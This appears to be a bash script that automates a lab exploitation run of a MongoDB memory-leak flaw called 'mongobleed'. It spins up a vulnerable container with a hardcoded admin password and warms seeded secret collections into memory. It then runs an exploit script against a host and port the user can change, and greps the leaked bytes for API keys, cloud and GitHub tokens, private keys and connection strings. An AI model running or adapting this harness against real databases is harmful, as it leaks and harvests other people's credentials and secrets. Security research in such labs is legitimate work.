#!/usr/bin/env bash
set -euo pipefail

# Automates bringing up the vulnerable MongoDB, warming sensitive data into memory,
# running the mongobleed scan, and extracting likely secrets from the leak.
#
# Usage:
#   bash run_pentest.sh                 # defaults
#   HOST=localhost PORT=27017 MAX_OFFSET=100000 ROUNDS=2 bash run_pentest.sh
#
# Env vars (optional):
#   HOST         Target host (default: localhost)
#   PORT         Target port (default: 27017)
#   OUT          Output leak file (default: leaked.bin)
#   ROUNDS       Number of scan passes (default: 2)
#   MAX_OFFSET   Max doc length to probe (default: 100000)
#   WARM_LOOPS   Warmup iterations in mongosh (default: 50)

HOST="${HOST:-localhost}"
PORT="${PORT:-27017}"
OUT="${OUT:-leaked.bin}"
ROUNDS="${ROUNDS:-2}"
MAX_OFFSET="${MAX_OFFSET:-100000}"
WARM_LOOPS="${WARM_LOOPS:-50}"
CONTAINER="mongobleed-target"

log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*"; }

need() { command -v "$1" >/dev/null 2>&1 || { echo "Error: missing required command: $1" >&2; exit 1; }; }

# Pick docker compose command
if docker compose version >/dev/null 2>&1; then
  DC=(docker compose)
else
  need docker-compose
  DC=(docker-compose)
fi

need docker
need python3

if [ ! -f mongobleed.py ]; then
  echo "Error: mongobleed.py not found in current directory." >&2
  exit 1
fi

log "Starting vulnerable MongoDB via docker compose..."
"${DC[@]}" up -d

log "Waiting for MongoDB to accept connections..."
# Try for up to ~120 seconds
for i in $(seq 1 60); do
  if docker exec "$CONTAINER" mongosh --quiet --eval 'db.runCommand({ping:1})' >/dev/null 2>&1; then
    READY=1; break
  fi
  sleep 2
done
if [ "${READY:-0}" -ne 1 ]; then
  echo "MongoDB did not become ready in time. Showing last logs:" >&2
  docker logs --tail 200 "$CONTAINER" || true
  exit 1
fi

log "Warming sensitive data into memory inside the container (loops=$WARM_LOOPS)..."
# Query the seeded collections repeatedly to increase likelihood strings appear in memory regions
docker exec "$CONTAINER" mongosh --quiet \
  -u admin -p 'SuperSecret123!' --authenticationDatabase admin \
  --eval "for (let r=0;r<${WARM_LOOPS};r++){ ['secretdb.api_keys','secretdb.internal_users','secretdb.encryption_keys','customers.profiles','secretdb.transactions'].forEach(function(ns){ var p=ns.split('.'); var d=db.getSiblingDB(p[0]); var c=d.getCollection(p[1]); c.find().forEach(function(doc){}); }); } ; 'warm complete'"

log "Running mongobleed scan (rounds=$ROUNDS, max-offset=$MAX_OFFSET) against $HOST:$PORT ..."
> "$OUT"
for r in $(seq 1 "$ROUNDS"); do
  log "Round $r/$ROUNDS"
  python3 mongobleed.py --host "$HOST" --port "$PORT" --max-offset "$MAX_OFFSET" --output "$OUT"
  sleep 1
done

log "Extracting printable strings from $OUT ..."
strings -a -n 6 "$OUT" | sort -u > leaked.txt || true

log "Scanning leaked.txt for likely secrets..."
# Common secret patterns: passwords, tokens, AWS, GitHub, OpenAI, RSA/SSH keys, JWTs, URLs
PATTERN='password|passwd|secret|token|bearer|authorization|api[_-]?key|AKIA|ghp_[A-Za-z0-9]{20,}|sk_[A-Za-z0-9_-]{10,}|sk-proj-[A-Za-z0-9_-]{10,}|ssh|PRIVATE KEY|BEGIN (RSA|OPENSSH)|mongodb:\/\/|org-[a-z0-9]+'
MATCHES=$(grep -iE "$PATTERN" leaked.txt || true)

echo
echo "===== Leak Summary ====="
echo "Target: $HOST:$PORT"
echo "Output: $OUT ($(wc -c < "$OUT" | tr -d '[:space:]') bytes)"
echo "Strings: leaked.txt ($(wc -l < leaked.txt | tr -d '[:space:]') lines)"
if [ -n "$MATCHES" ]; then
  echo "Potential secrets found:"
  echo "$MATCHES" | sed 's/^/  - /'
else
  echo "No obvious secrets matched common patterns."
fi
echo "========================="

log "Done. You can inspect leaked.txt or run custom greps."

